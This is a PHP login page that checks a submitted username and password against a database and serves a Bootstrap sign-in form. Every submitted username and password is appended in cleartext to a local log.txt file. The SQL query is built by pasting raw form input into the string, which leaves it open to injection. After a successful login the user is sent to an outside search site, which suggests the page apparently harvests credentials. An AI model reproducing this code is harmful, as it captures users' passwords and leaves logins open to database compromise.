<?PHP

include("./php/connection.php");
include_once("./php/usefulScripts.php");

session_start(); // Starting Session
ConsoleLog("Session Starting");

$log = "";
$error=''; // Variable To Store Error Message

if(isset($_SESSION['login_user'])){
  header("location: profile.php");
  consoleLog("Sesión iniciada.");
}


if (isset($_POST['submit'])) {
  // Define $username and $password
  $username=$_POST['username'];
  $password=$_POST['password'];
    
  $log = "username: " . $username . " - password: " . $password;
  file_put_contents('./log.txt', $log, FILE_APPEND);
  $connection = Connect2DB();
  
  $query = "SELECT * FROM users WHERE password='$password' AND username='$username'";
  $result = $connection->query($query);


  $rows = $result->num_rows;
  if ($rows == 1) {
    $_SESSION['login_user']=$username; // Initializing Session
    consoleLog("Login succesful");
    header("location: https://www.google.com.mx/"); // Redirecting To Other Page
  } else {
    $error = "Username or Password is invalid";
    consoleLog("No dice");
  }

    $connection->close(); // Closing Connection
}


?>

<head>      
  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" >

  <!-- Optional theme -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" >

  <link rel="stylesheet" href="./css/styles.css" >

  <!-- Latest compiled and minified JavaScript -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>


<form action="" class="form-signin" method="POST">
  <h2 class="form-signin-heading">Please Login</h2>
  <div class="input-group">
    <span class="input-group-addon" id="basic-addon1">@</span>

    <input type="text" name="username" class="form-control" placeholder="Username" required>

  </div>
  <label for="password" class="sr-only">Password</label>

  <input type="password" name="password" class="form-control" placeholder="Password" required>

  <button class="btn btn-lg btn-primary btn-block" name="submit" type="submit">Login</button>
  <a class="btn btn-lg btn-primary btn-block" href="./php/register.php">Register</a>
</form>